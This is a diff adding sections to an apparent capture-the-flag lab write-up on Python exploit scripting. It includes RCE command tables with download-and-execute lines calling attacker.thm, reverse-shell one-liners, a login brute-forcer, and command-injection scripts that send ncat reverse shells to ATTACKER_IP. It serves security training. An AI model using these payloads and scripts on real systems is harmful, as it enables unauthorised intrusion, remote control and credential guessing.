@@ -379,16 +379,289 @@ Once an RCE vulnerability is identified, we can execute various commands for rec
 
 Here are common commands used on Linux and Windows targets:
 
+**Linux RCE Commands**
 
+| Command                                              | Description                                           |
+|------------------------------------------------------|-------------------------------------------------------|
+| `whoami`                                             | Displays the user executing the command               |
+| `id`                                                 | Shows user and group IDs                              |
+| `uname -a`                                           | Prints system details                                 |
+| `cat /etc/passwd`                                    | Reads the system’s password file (if permissions allow) |
+| `ls -la`                                             | Lists files with permissions and ownership            |
+| `curl http://attacker.thm/shell.sh \| bash`          | Downloads and executes a shell script                 |
+| `nc -e /bin/bash <attackbox_ip> <port>`              | Establishes a reverse shell                           |
+| `python3 -c 'import pty; pty.spawn("/bin/bash")'`    | Upgrades to an interactive shell                      |
 
+**Windows RCE Commands**
 
+| Command                                                                 | Description                                 |
+|-------------------------------------------------------------------------|---------------------------------------------|
+| `whoami`                                                                | Shows the current user                      |
+| `hostname`                                                              | Displays system hostname                    |
+| `ipconfig /all`                                                         | Prints network information                  |
+| `net user`                                                              | Lists local users                           |
+| `tasklist`                                                              | Shows running processes                     |
+| `certutil -urlcache -f http://attacker.thm/shell.exe shell.exe`         | Downloads a file (often abused to fetch malware) |
+| `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.thm/shell.ps1')"` | Downloads and executes a remote PowerShell payload |
 
+### Writing an Exploit Script
+The target web application has a vulnerable endpoint that allows user-controlled command execution: `http://python.thm/labs/lab3/execute.php?cmd=<command>`
 
+<img width="340" height="87" alt="image" src="https://github.com/user-attachments/assets/c3c04fa4-6ba5-47a3-8e0a-1094901be3d0" />
 
+Our goal is to write a Python script to exploit this endpoint and automate command execution.
 
+#### Basic Exploit Script
 
+The following Python script sends a malicious payload to the vulnerable web application and retrieves the command output:
 
+```
+import requests
 
+# Target URL
+TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="
 
+# Command to execute
+command = "whoami"
 
+# Construct the exploit request
+response = requests.get(TARGET_URL + command)
 
+# Print the response
+if response.status_code == 200:
+    print("[+] Command Output:")
+    print(response.text)
+else:
+    print("[-] Exploit failed. HTTP Status:", response.status_code)
+```
+
+<img width="145" height="38" alt="image" src="https://github.com/user-attachments/assets/f5fbde77-3f99-441d-b9a4-7bc50f82afdc" />
+
+You can also check the `whoami` command directly from the website.
+
+<img width="347" height="95" alt="image" src="https://github.com/user-attachments/assets/bb33a6c4-1e90-4a05-96fa-b4cfc7bb3ed6" />
+
+#### Enhancing the Exploit
+
+Instead of executing a single command, we can create an interactive shell to run multiple commands dynamically.
+
+```
+import requests
+
+# Target URL
+TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="
+
+print("[+] Interactive Exploit Shell")
+while True:
+    cmd = input("Shell> ")  
+    if cmd.lower() in ["exit", "quit"]:
+        break
+    
+    response = requests.get(TARGET_URL + cmd)
+    
+    if response.status_code == 200:
+        print(response.text)
+    else:
+        print("[-] Exploit failed")
+```
+
+<img width="320" height="184" alt="image" src="https://github.com/user-attachments/assets/3fafeb54-f771-424e-b4a4-eaa3baacade6" />
+
+#### Launching a Reverse Shell
+
+Instead of executing commands one by one, we can use the exploit to send a reverse shell payload, which will give us persistent access.
+
+First, we have to start a reverse shell listener in our VM or AttackBox that will catch the connection using the command: `nc -lvnp 4444`
+
+##### Reverse Shell Payload (Linux)
+
+We will be using the following payload in the next exploit script: `ncat ATTACKBOX_IP 4444 -e /bin/bash`
+
+#### Automating Reverse Shell Execution
+
+We can modify our exploit script to send a reverse shell automatically:
+
+```
+import requests
+
+# Target URL
+TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="
+
+# Reverse shell payload (Change ATTACKBOX_IP)
+payload = "ncat ATTACKBOX_IP 4444 -e /bin/bash"
+
+print("[+] Sending reverse shell payload...")
+
+requests.get(TARGET_URL + payload)
+```
+
+### Answer the questions below
+
+What is the flag value?
+
+Start the netcat listener on your AttackBox with and update your reverse shell python code with your AttackBox IP address.
+
+Execute the python script and with ls and cat flag.txt command you get the flag!
+
+<img width="193" height="39" alt="image" src="https://github.com/user-attachments/assets/2009f3ee-ae4e-4cca-8075-d42f43d2eee0" />
+
+<img width="183" height="85" alt="image" src="https://github.com/user-attachments/assets/54d46772-787d-4935-b68f-33f89b4942ec" />
+
+You can also get the flag directly from the web by cmd=cat flag.txt without exploiting the web but after exploiting you get the full control of target machine.
+
+<img width="355" height="92" alt="image" src="https://github.com/user-attachments/assets/67e61c24-15ca-4fb3-8e39-fdbe8945a783" />
+
+## Task Automation
+
+### Automating Session Management
+
+When automating attacks against web applications, managing session persistence is crucial. Many web applications rely on session-based authentication, where a session cookie is assigned after login and must be sent with every request. Instead of manually handling session cookies, Python's requests.Session() class automates cookie management, allowing an exploit to:
+- Avoid manual login steps when testing a target
+- Maintain persistence even if the session expires
+- Help developers reproduce the exploit by automating complex interactions
+
+For this task we will be dealing with login page as `http://python.thm/labs/lab4/login.php`
+
+#### Maintaining the Session
+
+Instead of sending credentials with every request, we can log in once, store the session, and use it for future interactions.
+
+```
+import requests
+
+# Create a session object
+session = requests.Session()
+
+# Log in and maintain the session automatically
+login_url = "http://python.thm/labs/lab4/login.php"
+credentials = {"username": "admin", "password": "password123"}
+
+response = session.post(login_url, data=credentials)
+
+if "Welcome" in response.text:
+    print("[+] Login successful. Session cookies are stored automatically!")
+else:
+    print("[-] Login failed.")
+```
+
+<img width="301" height="26" alt="image" src="https://github.com/user-attachments/assets/bad0ef33-81a9-493d-998f-b11f9b928bc6" />
+
+After logging in, the `session` object remembers authentication cookies, allowing us to send authenticated requests without manually handling cookies.
+
+#### Automation From Login to Code Execution
+
+A well-automated exploit should handle:
+- Bypassing authentication via brute-forcing the login panel
+- Maintaining access by automating session management
+- Escalating privileges using RCE to gain a reverse shell
+
+Since `login.php` does not have brute force protection, we can automate credential guessing.
+
+```
+def brute_force_login():
+    """Brute forces the login panel."""
+    session = requests.Session()
+
+    wordlist = ["password", "admin123", "letmein", "qwerty", "12345"]
+
+    for password in wordlist:
+        print(f"[*] Trying password: {password}")
+        data = {"username": USERNAME, "password": password}
+        response = session.post(LOGIN_URL, data=data)
+
+        if "Welcome" in response.text:
+            print(f"[+] Login successful! Username: {USERNAME}, Password: {password}")
+            return session
+
+    print("[-] Brute force failed.")
+    return None
+```
+
+From the username as `admin` and password as `password123`, after login we can see the dashboard that it has drop down menu that executes commands like `date`
+
+<img width="679" height="252" alt="image" src="https://github.com/user-attachments/assets/a5e6772b-d726-48bd-bfb6-af0457a33fc4" />
+
+We can use this idea to manipulate the vulnerable drop-down menu to inject arbitrary commands.
+
+```
+def command_injection(session, command):
+    """Exploits command injection by sending a modified drop-down value."""
+    response = session.post(EXECUTE_URL, data={"cmd": command})
+
+    if response.status_code == 200:
+        print(f"[+] Command Output:\n{response.text}")
+    else:
+        print("[-] Exploit failed.")
+
+if session:
+    command_injection(session, "id")
+    command_injection(session, "whoami")
+```
+
+Now that we can execute arbitrary commands, we use this to spawn a reverse shell.
+
+```
+def get_reverse_shell(session, attacker_ip="ATTACKER_IP", attacker_port=4444):
+    """Sends a reverse shell payload."""
+    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
+
+    print("[+] Sending reverse shell payload...")
+    session.post(EXECUTE_URL, data={"cmd": payload})
+
+if session:
+    get_reverse_shell(session, "ATTACKER_IP", 4444)
+```
+
+The following script combines session automation, command injection, and privilege escalation.
+
+```
+import requests
+
+LOGIN_URL = "http://python.thm/labs/lab4/login.php"
+EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
+USERNAME = "admin"
+PASSWORD = "password123"
+
+def authenticate():
+    session = requests.Session()
+    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})
+
+    if "Welcome" in response.text:
+        print("[+] Authentication successful.")
+        return session
+    return None
+
+def execute_command(session, command):
+    response = session.post(EXECUTE_URL, data={"cmd": command})
+
+    if "Session expired" in response.text:
+        print("[-] Session expired! Re-authenticating...")
+        session = authenticate()
+
+    print(f"[+] Output:\n{response.text}")
+
+def get_reverse_shell(session, attacker_ip, attacker_port):
+    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
+    execute_command(session, payload)
+
+session = authenticate()
+if session:
+    execute_command(session, "whoami")
+    get_reverse_shell(session, "ATTACKER_IP", 4444)
+```
+
+Now, having started a listener with `nc -lvnp 4444` and saved the script as `exploit.py`, and run it using python3 as shown below:
+
+<img width="522" height="293" alt="image" src="https://github.com/user-attachments/assets/a6ded55f-3748-43c3-ae5d-dd5d0a901b3d" />
+
+If successful, the shell should connect back to our listener.
+
+<img width="191" height="91" alt="image" src="https://github.com/user-attachments/assets/f6eeca84-8739-4425-972e-54de613ec206" />
+
+### Answer the questions below
+
+What is the flag?
+
+Use the `cat` command to get the flag!
+
+<img width="206" height="101" alt="image" src="https://github.com/user-attachments/assets/7a46379f-af5c-4023-930c-a9c134824ca0" />
